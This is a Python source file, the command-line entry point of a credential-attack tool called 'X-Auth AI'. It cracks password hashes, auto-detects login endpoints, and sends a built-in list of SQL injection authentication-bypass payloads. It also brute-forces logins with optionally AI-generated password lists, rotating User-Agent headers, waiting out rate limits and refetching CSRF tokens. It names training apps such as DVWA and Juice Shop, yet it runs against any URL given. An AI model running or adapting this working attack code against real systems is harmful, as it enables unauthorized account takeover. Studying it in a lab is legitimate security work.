"""
main.py — X-Auth AI  CLI Entry Point

Supports THREE target modes:

  1. Traditional HTML form targets (DVWA, Mutillidae, WebGoat, etc.)
     → uses crawler + form_parser + brute_force + sqli_engine

  2. Modern JSON REST API targets (OWASP Juice Shop)
     → auto-detected via /rest/user/login fingerprint
     → uses juice_shop_adapter (JWT detection, SQLite payloads)

  3. Generic JSON REST API targets (SecureLab, custom backends)
     → auto-detected when URL returns JSON on POST with 401/200
     → uses generic_api_adapter (configurable field names, success detection)

Auto-detection order:
    Juice Shop check → Generic JSON API check → Traditional HTML crawl
"""

import click
import json
import os

from core.banner import print_banner
from core.logger import logger


@click.group()
def cli():
    """X-Auth AI — Credential Intelligence Engine"""
    print_banner()


# ─────────────────────────────────────────────────────────────────────────────
# crack command  (unchanged)
# ─────────────────────────────────────────────────────────────────────────────
@cli.command("crack")
@click.option("--hash",     "-h", required=True, help="Hash string to crack")
@click.option("--wordlist", "-w", default=None,  help="Path to wordlist")
@click.option("--gpu",      "-g", is_flag=True,  help="Force Hashcat GPU mode")
@click.option("--output",   "-o", default=None,  help="Save result to JSON file")
def crack_cmd(hash, wordlist, gpu, output):
    """Crack a password hash using wordlist + GPU fallback."""
    from core.config import WORDLIST_DEFAULT
    from lab.cracker import crack
    from lab.hashcat_runner import run_hashcat

    wordlist = wordlist or WORDLIST_DEFAULT
    result   = run_hashcat(hash, wordlist) if gpu else crack(hash, wordlist)
    if not gpu and result["status"] == "not_found":
        result = run_hashcat(hash, wordlist)

    if output:
        with open(output, "w") as f:
            json.dump(result, f, indent=2)
        click.echo(f"\nResult saved to {output}")

    return result


# ─────────────────────────────────────────────────────────────────────────────
# scan command
# ─────────────────────────────────────────────────────────────────────────────
@cli.command("scan")
@click.option("--url",         "-u", required=True,
              help="Target URL  (base URL, login page, or direct API endpoint)")
@click.option("--sqli/--no-sqli",           default=True,  help="Run SQL injection tests")
@click.option("--brute/--no-brute",         default=True,  help="Run brute force")
@click.option("--ratelimit/--no-ratelimit", default=True,  help="Test rate limiting")
@click.option("--max-pages",   default=20,
              help="Max pages to crawl (traditional targets only)")
@click.option("--company",     "-c", default=None,
              help="Target company name for AI wordlist")
@click.option("--usernames",   "-n", default=None,
              help="Comma-separated known usernames / emails")
@click.option("--ai",          is_flag=True, default=False,
              help="Enable local AI password generation")
@click.option("--api-login",   default=None,
              help="Direct JSON login endpoint  e.g. http://localhost:3001/api/auth/login")
@click.option("--api-user-field",  default="username",
              help="JSON field name for username  (default: username)")
@click.option("--api-pass-field",  default="password",
              help="JSON field name for password  (default: password)")
@click.option("--api-csrf-url",    default=None,
              help="URL to GET a fresh CSRF token before each attempt  e.g. http://localhost:3001/api/csrf-token")
@click.option("--api-csrf-field",  default="csrf_token",
              help="JSON field name in CSRF response  (default: csrf_token)")
@click.option("--api-csrf-body-key", default="user_token",
              help="Key to send CSRF token under in login body  (default: user_token)")
def scan(url, sqli, brute, ratelimit, max_pages, company, usernames, ai,
         api_login, api_user_field, api_pass_field,
         api_csrf_url, api_csrf_field, api_csrf_body_key):
    """Full attack scan. Auto-detects Juice Shop, generic JSON APIs, and HTML forms."""

    from rich.console import Console
    console = Console()

    # ── Detection order ───────────────────────────────────────────────────────

    # 1. Juice Shop
    from attacker.juice_shop_adapter import is_juice_shop
    if is_juice_shop(url):
        console.print(
            "\n[bold magenta]"
            "⚡  Juice Shop detected — switching to JSON REST API mode"
            "[/bold magenta]\n"
        )
        _run_juice_shop_scan(console, url, sqli, brute, ratelimit,
                             company, usernames, ai)
        return

    # 2. Explicit --api-login flag OR auto-detect generic JSON API
    login_endpoint = api_login or _detect_json_api(url)
    if login_endpoint:
        console.print(
            "\n[bold magenta]"
            f"⚡  JSON API detected — targeting endpoint directly: {login_endpoint}"
            "[/bold magenta]\n"
        )
        _run_json_api_scan(
            console, url, login_endpoint,
            api_user_field, api_pass_field,
            api_csrf_url, api_csrf_field, api_csrf_body_key,
            sqli, brute, ratelimit, company, usernames, ai,
        )
        return

    # 3. Traditional HTML crawl (DVWA etc.)
    _run_traditional_scan(console, url, sqli, brute, ratelimit,
                          max_pages, company, usernames, ai)


# ─────────────────────────────────────────────────────────────────────────────
# AUTO-DETECT GENERIC JSON API
# ─────────────────────────────────────────────────────────────────────────────

def _detect_json_api(base_url: str) -> str | None:
    """
    Probes common JSON login endpoint paths under base_url.
    Returns the first one that responds with JSON and looks like a login endpoint.
    Returns None if nothing found (fall through to HTML crawl).
    """
    import requests

    # Common JSON login endpoint suffixes to probe
    CANDIDATES = [
        "/api/auth/login",
        "/api/login",
        "/auth/login",
        "/api/user/login",
        "/login",
    ]

    for path in CANDIDATES:
        url = base_url.rstrip("/") + path
        try:
            resp = requests.post(
                url,
                json={"username": "__probe__", "password": "__probe__"},
                timeout=5,
                verify=False,
                allow_redirects=False,
            )
            ct = resp.headers.get("Content-Type", "")
            # A JSON response to a POST probe means this is a real API endpoint
            if "application/json" in ct and resp.status_code in (200, 401, 403, 422):
                return url
        except Exception:
            continue

    return None


# ─────────────────────────────────────────────────────────────────────────────
# GENERIC JSON API SCAN  (SecureLab, custom backends)
# ─────────────────────────────────────────────────────────────────────────────

def _run_json_api_scan(
    console, base_url, login_endpoint,
    user_field, pass_field,
    csrf_url, csrf_field, csrf_body_key,
    sqli, brute, ratelimit,
    company, usernames, ai,
):
    """
    Attacks any generic JSON REST login endpoint.
    Works for SecureLab (and any similar custom app) without hardcoded assumptions.

    Success detection:
      - HTTP 200 + JSON body contains  "status": "success"  OR  "token"  OR  "user"
    Failure detection:
      - HTTP 401 / 403 / 422 / 500
    """
    import requests as _requests
    import time
    import random
    from fake_useragent import UserAgent
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
    from rich.table import Table

    try:
        from core.config import TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS
    except ImportError:
        TARGET_TIMEOUT     = 10
        SESSION_DELAY      = 0.3
        MAX_BRUTE_ATTEMPTS = 999999

    try:
        from attacker.detective import compile_findings
    except ImportError:
        compile_findings = None

    from attacker.rate_limiter_test import test_rate_limiting

    ua = UserAgent()

    # Build target dict that rate_limiter_test and sqli_engine understand
    target = {
        "action":         login_endpoint,
        "source_page":    login_endpoint,
        "method":         "POST",
        "username_field": user_field,
        "password_field": pass_field,
        "extra_fields":   {},
        "csrf_field":     None,
        "is_spa":         True,
        "is_json":        True,
    }

    console.print(f"[bold cyan]{'─'*45} Phase 2 — Reconnaissance {'─'*45}[/bold cyan]\n")
    console.print(f"[bold cyan]Target (JSON API):[/bold cyan] {login_endpoint}")
    csrf_line = f"\n[dim]  CSRF token URL : {csrf_url}[/dim]" if csrf_url else ""
    console.print(f"[dim]  Username field : {user_field}\n  Password field : {pass_field}{csrf_line}[/dim]")

    # ── AI phase ──────────────────────────────────────────────────────────────
    extra_credentials = []
    if ai:
        console.print(
            f"\n[bold magenta]{'─'*45} Phase 3 — AI Intelligence {'─'*45}[/bold magenta]\n"
        )
        try:
            from intelligence.context_builder import build_context
            from intelligence.ai_guesser      import generate_ai_wordlist
            from intelligence.wordlist_merger  import merge_wordlists

            username_list = (
                [u.strip() for u in usernames.split(",") if u.strip()]
                if usernames else ["admin"]
            )
            context       = build_context(base_url, company_name=company or "",
                                          usernames=username_list)
            raw_passwords = generate_ai_wordlist(context)
            extra_credentials = merge_wordlists(
                ai_passwords=raw_passwords,
                base_credentials=[],
                usernames=username_list,
            )
            console.print(
                f"[bold magenta]  {len(extra_credentials)} AI credential pairs ready[/bold magenta]\n"
            )
        except Exception as exc:
            logger.error(f"AI phase failed: {exc}", exc_info=True)
            console.print(f"[yellow]  AI phase skipped: {exc}[/yellow]")

    console.print(f"\n[bold cyan]{'─'*45} Phase 2 — Attack {'─'*45}[/bold cyan]\n")
    console.print(f"[bold white]Testing:[/bold white] {login_endpoint}\n")

    sqli_results  = []
    brute_results = []
    rate_results  = []

    # ── Helper: fetch fresh CSRF token ────────────────────────────────────────
    def get_csrf() -> str | None:
        if not csrf_url:
            return None
        try:
            r = _requests.get(csrf_url, timeout=TARGET_TIMEOUT, verify=False)
            return r.json().get(csrf_field)
        except Exception:
            return None

    # ── Helper: check if response means login success ─────────────────────────
    def is_success(resp) -> bool:
        if resp.status_code != 200:
            return False
        try:
            data = resp.json()
            return (
                data.get("status") == "success"
                or "token" in data
                or "user" in data
                or data.get("success") is True
            )
        except Exception:
            return False

    # ── SQLi phase ────────────────────────────────────────────────────────────
    if sqli:
        console.print(f"\n[bold red]JSON SQLi scan:[/bold red] {login_endpoint}")

        # Classic payloads that work against SQLite and MySQL
        PAYLOADS = [
            ("' OR '1'='1",             "classic bypass"),
            ("' OR '1'='1' --",         "comment bypass"),
            ("' OR '1'='1' #",          "MySQL hash comment"),
            ("' OR 1=1 --",             "numeric bypass"),
            ("admin' --",               "admin direct"),
            ("' OR TRUE--",             "SQLite OR TRUE"),
            ("') OR ('1'='1",           "bracket bypass"),
            ("' UNION SELECT 1,1 --",   "union 2-col"),
            ("' UNION SELECT 1,1,1 --", "union 3-col"),
            ("'",                       "single quote error"),
            ("\" OR \"\"=\"",           "double quote bypass"),
            ("' OR SLEEP(3) --",        "MySQL time blind"),
        ]

        console.print(f"[dim]{len(PAYLOADS)} payloads | JSON body | {user_field} field[/dim]\n")

        session = _requests.Session()
        session.headers.update({"User-Agent": ua.random, "Content-Type": "application/json"})

        vuln_count = 0
        results    = []

        for payload, category in PAYLOADS:
            try:
                body = {user_field: payload, pass_field: "xauth_sqli_test"}
                csrf = get_csrf()
                if csrf:
                    body[csrf_body_key] = csrf

                resp = session.post(
                    login_endpoint, json=body,
                    timeout=TARGET_TIMEOUT, verify=False,
                )

                vulnerable = False
                evidence   = "no indicators"

                if is_success(resp):
                    vulnerable = True
                    evidence   = f"HTTP {resp.status_code} — auth bypassed"
                elif resp.status_code == 500:
                    vulnerable = True
                    evidence   = "HTTP 500 — SQL error triggered"
                elif resp.status_code == 200:
                    # check for SQL error text in body
                    body_text = resp.text.lower()
                    if "sql error" in body_text or "sqlite" in body_text or "syntax error" in body_text:
                        vulnerable = True
                        evidence   = "SQL error message in response"

                results.append({
                    "payload":    payload,
                    "category":   category,
                    "status_code": resp.status_code,
                    "vulnerable": vulnerable,
                    "evidence":   evidence,
                })

                if vulnerable:
                    vuln_count += 1
                    console.print(
                        f"  [bold red]VULNERABLE[/bold red]  "
                        f"[dim][{category}][/dim]  "
                        f"[yellow]{payload[:50]}[/yellow]  → {evidence}"
                    )
                else:
                    console.print(
                        f"  [dim green]safe[/dim green]  "
                        f"[dim][{category}] {payload[:45]}[/dim]"
                    )

            except Exception as exc:
                logger.warning(f"[SQLi] payload error: {exc}")

            time.sleep(SESSION_DELAY)

        if vuln_count:
            console.print(f"\n[bold red]{vuln_count} SQLi vulnerabilities confirmed.[/bold red]\n")
        else:
            console.print("\n[green]No SQLi vulnerabilities confirmed.[/green]\n")

        sqli_results.append({
            "target":          login_endpoint,
            "attack_type":     "sql_injection_json",
            "payloads_tested": len(PAYLOADS),
            "vulnerable":      vuln_count > 0,
            "vuln_count":      vuln_count,
            "results":         results,
            "injection_point": f"{user_field} (JSON body)",
        })

    # ── Brute force phase ─────────────────────────────────────────────────────
    if brute:
        from attacker.brute_force import build_full_wordlist

        console.print(f"\n[bold red]JSON Brute force:[/bold red] {login_endpoint}")

        creds = build_full_wordlist(extra_credentials)
        console.print(f"[dim]  {len(creds)} credential pairs to try[/dim]\n")

        found    = None
        attempts = 0
        session  = _requests.Session()
        session.headers.update({"User-Agent": ua.random, "Content-Type": "application/json"})

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
            transient=False,
        ) as progress:
            task = progress.add_task("[cyan]Brute-forcing...", total=len(creds))

            i = 0
            while i < len(creds):
                username_val, password_val = creds[i]
                attempts += 1

                if attempts % 10 == 0:
                    session.headers["User-Agent"] = ua.random

                try:
                    body = {user_field: username_val, pass_field: password_val}

                    # Fetch fresh CSRF before every attempt if configured
                    csrf = get_csrf()
                    if csrf:
                        body[csrf_body_key] = csrf

                    resp = session.post(
                        login_endpoint, json=body,
                        timeout=TARGET_TIMEOUT, verify=False, allow_redirects=True,
                    )

                    if resp.status_code == 429:
                        console.print(
                            "\n[bold yellow]⚠  RATE LIMITED — cooling down 30 s...[/bold yellow]"
                        )
                        time.sleep(30)
                        continue  # retry same credential

                    if is_success(resp):
                        try:
                            data  = resp.json()
                            token = data.get("token") or data.get("jwt") or ""
                        except Exception:
                            token = ""
                        found = {
                            "username": username_val,
                            "password": password_val,
                            "attempt":  attempts,
                            "url":      login_endpoint,
                            "token":    token,
                        }
                        progress.update(task, advance=1)
                        break

                except _requests.exceptions.Timeout:
                    logger.warning(f"[BruteForce] Timeout at attempt {attempts}")
                except Exception as exc:
                    logger.warning(f"[BruteForce] Error at attempt {attempts}: {exc}")

                progress.update(
                    task, advance=1,
                    description=f"[cyan]Trying [white]{username_val}[/white]:[dim]{password_val[:14]}[/dim]",
                )
                i += 1
                time.sleep(SESSION_DELAY + random.uniform(0, 0.1))

        # Summary table
        table = Table(title="Brute Force Summary", border_style="bright_blue")
        table.add_column("Metric", style="cyan")
        table.add_column("Result", style="white")
        table.add_row("Total Pairs",   str(len(creds)))
        table.add_row("Attempts Made", str(attempts))
        if found:
            table.add_row("Status",    "[bold green]✔  SUCCESS[/bold green]")
            table.add_row("Username",  found["username"])
            table.add_row("Password",  found["password"])
            table.add_row("Attempt #", str(found["attempt"]))
        else:
            table.add_row("Status", f"[yellow]✘  Exhausted all {len(creds)} pairs[/yellow]")
        console.print(table)

        brute_results.append({
            "target":      login_endpoint,
            "found":       found is not None,
            "credentials": found,
            "attempts":    attempts,
            "mode":        "json",
        })

    # ── Rate limit phase ──────────────────────────────────────────────────────
    if ratelimit:
        rate_target = {
            **target,
            "extra_fields": {},
        }
        rate_results.append(test_rate_limiting(rate_target))

    # ── Report ────────────────────────────────────────────────────────────────
    if compile_findings:
        compile_findings(sqli_results, brute_results, rate_results, base_url)

    console.print("\n[bold green]✔  Scan completed.[/bold green]")


# ─────────────────────────────────────────────────────────────────────────────
# JUICE SHOP SCAN PIPELINE  (unchanged from original)
# ─────────────────────────────────────────────────────────────────────────────
def _run_juice_shop_scan(console, url, sqli, brute, ratelimit, company, usernames, ai):
    from attacker.juice_shop_adapter import (
        build_juice_shop_target,
        brute_force_json,
        sqli_json,
    )
    from attacker.rate_limiter_test import test_rate_limiting

    try:
        from attacker.detective import compile_findings
    except ImportError:
        compile_findings = None

    target = build_juice_shop_target(url)

    console.print(f"[bold cyan]{'─'*45} Phase 2 — Reconnaissance {'─'*45}[/bold cyan]\n")
    console.print(f"[bold cyan]Target (Juice Shop REST):[/bold cyan] {target['action']}\n")

    extra_credentials = []
    if ai:
        console.print(
            f"\n[bold magenta]{'─'*45} Phase 3 — AI Intelligence {'─'*45}[/bold magenta]\n"
        )
        try:
            from intelligence.context_builder import build_context
            from intelligence.ai_guesser      import generate_ai_wordlist
            from intelligence.wordlist_merger  import merge_wordlists

            username_list = (
                [u.strip() for u in usernames.split(",") if u.strip()]
                if usernames else ["admin@juice-sh.op"]
            )
            context       = build_context(url, company_name=company or "JuiceShop",
                                          usernames=username_list)
            raw_passwords = generate_ai_wordlist(context)
            extra_credentials = merge_wordlists(
                ai_passwords=raw_passwords,
                base_credentials=[],
                usernames=username_list,
            )
            console.print(
                f"[bold magenta]  {len(extra_credentials)} AI credential pairs ready[/bold magenta]\n"
            )
        except Exception as exc:
            logger.error(f"AI phase failed: {exc}", exc_info=True)
            console.print(f"[yellow]  AI phase skipped: {exc}[/yellow]")

    console.print(f"\n[bold cyan]{'─'*45} Phase 2 — Attack {'─'*45}[/bold cyan]\n")
    console.print(f"[bold white]Testing:[/bold white] {target['action']}\n")

    sqli_results  = []
    brute_results = []
    rate_results  = []

    if sqli:
        sqli_results.append(sqli_json(target))
    if brute:
        brute_results.append(brute_force_json(target, extra_credentials))
    if ratelimit:
        rate_target = {**target, "source_page": target["action"],
                       "username_field": "email", "password_field": "password",
                       "extra_fields": {}}
        rate_results.append(test_rate_limiting(rate_target))

    if compile_findings:
        compile_findings(sqli_results, brute_results, rate_results, url)

    console.print("\n[bold green]✔  Scan completed.[/bold green]")


# ─────────────────────────────────────────────────────────────────────────────
# TRADITIONAL HTML FORM SCAN PIPELINE  (unchanged from original)
# ─────────────────────────────────────────────────────────────────────────────
def _run_traditional_scan(console, url, sqli, brute, ratelimit,
                           max_pages, company, usernames, ai):
    from scout.crawler              import crawl
    from scout.form_parser          import extract_auth_targets
    from attacker.sqli_engine       import test_sqli
    from attacker.brute_force       import brute_force
    from attacker.rate_limiter_test import test_rate_limiting

    try:
        from attacker.detective import compile_findings
    except ImportError:
        compile_findings = None

    console.print(f"\n[bold cyan]{'─'*45} Phase 2 — Reconnaissance {'─'*45}[/bold cyan]\n")
    console.print(f"[bold cyan]Target:[/bold cyan] {url}\n")

    crawl_data = crawl(url, max_pages=max_pages)
    targets    = extract_auth_targets(crawl_data)

    if not targets:
        console.print("[yellow]No auth forms found. Exiting.[/yellow]")
        return

    extra_credentials = []
    if ai:
        console.print(
            f"\n[bold magenta]{'─'*45} Phase 3 — AI Intelligence {'─'*45}[/bold magenta]\n"
        )
        try:
            from intelligence.context_builder import build_context
            from intelligence.ai_guesser      import generate_ai_wordlist
            from intelligence.wordlist_merger  import merge_wordlists

            username_list = (
                [u.strip() for u in usernames.split(",") if u.strip()]
                if usernames else ["admin"]
            )
            context       = build_context(url, company_name=company or "",
                                          usernames=username_list)
            raw_passwords = generate_ai_wordlist(context)
            extra_credentials = merge_wordlists(
                ai_passwords=raw_passwords,
                base_credentials=[],
                usernames=username_list,
            )
            console.print(
                f"[bold magenta]  {len(extra_credentials)} AI credential pairs ready[/bold magenta]\n"
            )
        except Exception as exc:
            logger.error(f"AI phase failed: {exc}", exc_info=True)
            console.print(f"[yellow]  AI phase skipped: {exc}[/yellow]")

    console.print(f"\n[bold cyan]{'─'*45} Phase 2 — Attack {'─'*45}[/bold cyan]\n")

    sqli_results  = []
    brute_results = []
    rate_results  = []

    for target in targets:
        console.print(f"\n[bold white]Testing:[/bold white] {target['action']}\n")
        if sqli:
            sqli_results.append(test_sqli(target))
        if brute:
            brute_results.append(brute_force(target, extra_credentials=extra_credentials))
        if ratelimit:
            rate_results.append(test_rate_limiting(target))

    if compile_findings:
        compile_findings(sqli_results, brute_results, rate_results, url)

    console.print("\n[bold green]✔  Scan completed.[/bold green]")


# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    cli()